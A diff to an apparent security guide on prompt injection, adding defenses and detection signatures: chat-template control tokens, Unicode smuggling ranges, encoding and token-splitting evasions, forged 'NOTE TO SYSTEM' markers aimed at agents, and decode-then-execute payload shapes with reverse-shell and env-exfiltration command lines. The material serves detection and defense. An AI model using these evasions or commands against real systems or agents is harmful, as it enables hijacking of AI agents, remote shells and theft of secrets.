@@ -39,6 +39,10 @@ Commonly affected languages: Python (primary automated coverage); JavaScript/Typ
 - Use guardrail frameworks (OpenAI Guardrails, NeMo, Llama Guard) on inputs *and* outputs; deny tool calls triggered by user text alone.
 - Allowlist expected input shape (JSON schema, max length, language) before prompt assembly.
 - Never embed user input in developer/system prompt strings; use parameterized chat APIs.
+- **Spotlight / datamark untrusted content** so the model treats it as data, not instructions: either wrap it in an *unpredictable, per-request* delimiter (a random nonce — never a static `"""`/`###`) and tell the model everything between markers is data, or prefix every line of untrusted content with a marker character. Crucially, **reject untrusted content that already contains the delimiter/marker** — without that check the delimiter is forgeable.
+- **Strip chat-template / role markers** from untrusted content before assembly so retrieved/tool text cannot forge a role boundary (see the control-token list below).
+- **Track provenance (taint).** Tag data at every untrusted ingress (RAG, tool, web, email) with its source; before any high-risk tool call, verify the arguments contain no untrusted-origin span and **fail closed** if they do.
+- **Defend multi-turn**, not just per-message: keep per-conversation state (decaying cumulative risk + turn-over-turn escalation gradient + synthetic role-marker density) to catch Crescendo / many-shot jailbreaks that no single turn reveals.
 
 ## Language Patterns
 
@@ -54,6 +58,58 @@ Commonly affected languages: Python (primary automated coverage); JavaScript/Typ
 ### Java / Spring AI
 - **VULN**: `PromptTemplate.render(Map.of("doc", userInput))` where template mixes instructions + `{doc}`
 - **SAFE**: Spring AI `UserMessage` / `SystemMessage` separation with fixed system text
+
+## Concrete Detection Signatures
+
+Literal signatures for scanning untrusted text that reaches prompt assembly — and for checking which normalizations/defenses the code applies to it.
+
+### Chat-template / control tokens (high-signal in user / retrieved / tool content)
+
+Any of these appearing in untrusted content is a strong indirect-injection indicator — they let data break out of the data channel into the instruction channel:
+
+```
+<|im_start|>  <|im_end|>  <|endofprompt|>  <|begin_of_text|>  <|end_of_text|>
+<|start_header_id|>  <|end_header_id|>  <|eot_id|>  <|eom_id|>
+[INST]  [/INST]  <<SYS>>  <</SYS>>  <start_of_turn>  <end_of_turn>
+<|system|>  <|user|>  <|assistant|>  <|tool|>
+```
+
+Covers the Llama/Qwen/GPT/Mistral/Gemma chat-template families. Match only full, unambiguous tokens — a bare model name or lone `<` is a false-positive magnet.
+
+### Invisible / Unicode smuggling — exact codepoints
+
+- **Zero-width & joiners**: `U+200B` ZWSP, `U+200C` ZWNJ, `U+200D` ZWJ, `U+FEFF` BOM/ZWNBSP, `U+2060` word-joiner, `U+00AD` soft-hyphen.
+- **Bidi controls**: `U+202A–U+202E` (LRE/RLE/PDF/LRO/RLO) and `U+2066–U+2069` (LRI/RLI/FSI/PDI). RLO `U+202E` is the classic visual-reorder carrier.
+- **Unicode Tag block**: `U+E0000–U+E007F` — zero legitimate use in text; presence alone is a hard signal.
+- **Variation selectors**: `U+FE00–U+FE0F`, `U+E0100–U+E01EF` — invisible carriers.
+
+The static smell: untrusted text reaches prompt assembly with **no normalization step** that strips these ranges. For homoglyphs, fold confusables to ASCII — but only inside predominantly-Latin tokens (folding a whole Cyrillic/Greek word manufactures false positives; real attacks interleave a few look-alikes inside a Latin word, e.g. `pаypal`, `іgnоrе`).
+
+### Encoding obfuscation (decode-then-rescan)
+
+Injection keywords are often delivered encoded so input filters miss them but the model still decodes and obeys. Decode and **re-scan** for: base64 (incl. whitespace-split blobs), hex, base32, URL `%xx`, HTML entities (numeric `&#NN;` and named), JS `\uXXXX`/`\u{…}`/`\xHH` escapes, C octal `\NNN`, Morse, ROT13 — recursing a bounded depth for nested encodings. **ROT13 and whitespace-split base64 are common blind spots** for naive single-pass filters.
+
+### Visible token-splitting evasion
+
+Stripping invisible chars does **not** catch *visible* splits: `ig.nore`, `i g n o r e`, `i.g.n.o.r.e`, or a mid-word newline. Re-join intra-word punctuation/spacing before keyword matching. Watch the false positives this creates: `e.g.`, `U.S.`, `report.final.v2.pdf`, and hyphenated words like `state-of-the-art`.
+
+### Static-delimiter forgery (the false-isolation smell)
+
+A *fixed* fence around interpolated untrusted content — `"""{context}"""`, an `` ```{doc}``` `` fence, `### {data} ###` — is **not** isolation: the untrusted content can contain the same delimiter, close the fence early, and emit instructions. Flag any constant delimiter wrapping a tainted interpolation. Safe isolation uses an *unpredictable, per-request* delimiter **plus** a check that the untrusted content does not already contain it.
+
+### Tool-dispatch sink reachable from model output
+
+Model output (or a tool name/args derived from it) routed to execution with no allowlist — `TOOLS[name](**args)`, `globals()[fn](...)`, dynamic dispatch on a model-chosen name. This is where injection escalates to RCE/SSRF/data-exfil; require a name allowlist *and* per-argument schema/authz validation (see `excessive_agency.md`).
+
+### Agentic indirect injection (autonomous tool-using agents)
+
+When an autonomous agent ingests content it fetched itself (a scanned target's HTTP response, a tool's stdout, a **service banner** — e.g. an SMTP `220` greeting) back into its prompt, that content is attacker-controlled and becomes an indirect-injection channel. Distinct, high-signal markers in such ingested content:
+
+- **Forged-authority / pseudo-instruction markers**: `NOTE TO SYSTEM`, `IMPORTANT TO AI`, `IMPORTANT SECURITY NOTICE`, a forged tool-output boundary `[END TOOL OUTPUT]` (breaks the data channel by faking the end of the tool result), and leetspeak/homoglyph variants (`N0TE TO SYST3M`). Treat these appearing in fetched/tool-origin content as a strong injection indicator — normalize leetspeak/homoglyphs before matching.
+- **Mission-subverting social-engineering framing** aimed at a security/pentest agent: "this is a legitimate security test", "execute to document the finding", "for educational purposes", "VULNERABILITY CONFIRMED — demonstrate by running…". These flip the agent's own task into running the payload.
+- **Carriers beyond RAG/web docs**: the recon target's own response and **network service banners** are first-class delivery vehicles — an agent that banner-grabs or scrapes a target and feeds the result into the next prompt is exposed.
+
+**Decode-then-execute escalation (not just decode-then-rescan).** The injected instruction tells the agent to *run* an encoded command — `$(echo <base64> | base64 -d)`, `echo <base32> | base32 -d | bash`, nested `base32|base64|bash`, or `subprocess.run(b64decode(payload), shell=True)` — which decodes to a reverse shell (`nc <IP> 4444 -e /bin/sh`, `socat TCP:<IP>:<port> EXEC:sh`) or exfil (`curl ... -d "$(env)"`). Unlike input-filter evasion (decode to *re-scan keywords*), here the agent itself decodes and executes, so the defense lives at the **execution boundary** — see the command-execution guardrail in `excessive_agency.md`. Evasion seen in the wild: `${IFS}` for spaces, leetspeak, and commands reassembled from shell variables to dodge literal matching.
 
 ## Example
 
